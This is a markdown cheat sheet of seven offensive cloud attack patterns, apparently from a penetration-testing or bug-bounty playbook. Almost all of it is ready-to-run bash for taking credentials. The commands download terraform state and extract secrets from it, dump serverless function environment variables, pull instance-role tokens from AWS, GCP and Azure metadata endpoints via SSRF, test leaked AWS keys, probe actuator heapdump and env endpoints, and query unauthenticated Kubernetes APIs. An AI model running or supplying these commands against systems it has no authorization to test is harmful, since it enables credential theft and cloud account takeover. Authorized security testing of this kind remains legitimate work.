# Proven Cloud Attack Patterns

Quick-check patterns with high hit rates. Run these first before systematic phase testing.

## Pattern 1: Public S3/GCS via CNAME

**Hit rate:** High — many companies expose storage via subdomains
**Check:**
```bash
# Find storage CNAMEs
dig +short CNAME assets.target.com  # → bucket.s3.amazonaws.com
dig +short CNAME cdn.target.com     # → storage.googleapis.com

# Test listing via CNAME (may work even when direct access denied)
curl -s "https://assets.target.com/" | head -50
# Compare with direct
aws s3 ls s3://bucket-name --no-sign-request
```
**Impact:** Low (listing only) → Critical (if contains terraform.tfstate, .env, backups)

## Pattern 2: Terraform State in Storage

**Hit rate:** Medium-high — common in IaC-heavy orgs
**Check:**
```bash
# Common paths in discovered buckets
for key in terraform.tfstate terraform/state .terraform/terraform.tfstate infra/terraform.tfstate; do
  aws s3 cp "s3://<bucket>/$key" /tmp/tfstate --no-sign-request 2>/dev/null && echo "FOUND: $key"
done
# Extract secrets from state
cat /tmp/tfstate | jq -r '.. | .access_key? // .secret_key? // .password? // empty' 2>/dev/null | sort -u
```
**Impact:** Critical — state files contain plaintext credentials, DB passwords, API keys

## Pattern 3: Lambda/Function Environment Variables

**Hit rate:** High — developers store secrets in env vars
**Check:**
```bash
# AWS — list all functions, extract env vars
aws lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' | while read fn; do
  aws lambda get-function-configuration --function-name "$fn" --query 'Environment.Variables' 2>/dev/null
done

# GCP
gcloud functions list --format='value(name)' | while read fn; do
  gcloud functions describe "$fn" --format='value(environmentVariables)'
done
```
**Impact:** High-Critical — DB credentials, API keys, signing secrets

## Pattern 4: IMDSv1 Metadata via SSRF

**Hit rate:** Medium — requires SSRF, but IMDSv1 still common
**Check:**
```bash
# If you have SSRF (from ptest/atest):
# AWS IMDSv1 (no token needed)
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Then fetch the role credentials
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"

# GCP (requires header but SSRF often passes it)
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Azure
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
**Impact:** Critical — instance role credentials → cloud account access

## Pattern 5: GitHub Leaked AWS Keys

**Hit rate:** Medium — automated scanners catch most, but old commits persist
**Check:**
```bash
# Search GitHub for org's leaked keys
# Patterns: AKIA (AWS access key), ASIA (temporary), private_key
# Use trufflehog or github search:
# https://github.com/search?q=org%3A<org>+AKIA&type=code
# https://github.com/search?q=<company>+aws_secret_access_key&type=code

# Verify found key is still active
aws sts get-caller-identity  # with the found credentials
```
**Impact:** High-Critical — depends on key's IAM permissions

## Pattern 6: Actuator/Debug on Cloud-Hosted Apps

**Hit rate:** Medium-high — Spring Boot apps on ECS/EKS often expose actuator
**Check:**
```bash
for path in /actuator/env /actuator/configprops /actuator/heapdump /env /debug/vars; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://<target>$path")
  [ "$code" = "200" ] && echo "EXPOSED: $path"
done
```
**Impact:** High — /actuator/env leaks cloud credentials, DB strings, API keys

## Pattern 7: Public EKS/GKE API Server

**Hit rate:** Low-medium — but Critical when found
**Check:**
```bash
# Common K8s API ports
for port in 6443 443 8443; do
  curl -sk "https://<target>:$port/version" 2>/dev/null | grep -q "major" && echo "K8S API: port $port"
done
# Unauthenticated access check
curl -sk "https://<target>:6443/api/v1/namespaces" | head -20
curl -sk "https://<target>:6443/api/v1/pods" | head -20
```
**Impact:** Critical — unauthenticated K8s API = full cluster compromise

---

## When to Add New Patterns

Add after engagement when:
- Pattern produced a confirmed finding
- Applies to multiple cloud environments (not target-specific)
- Can be checked in <5 minutes
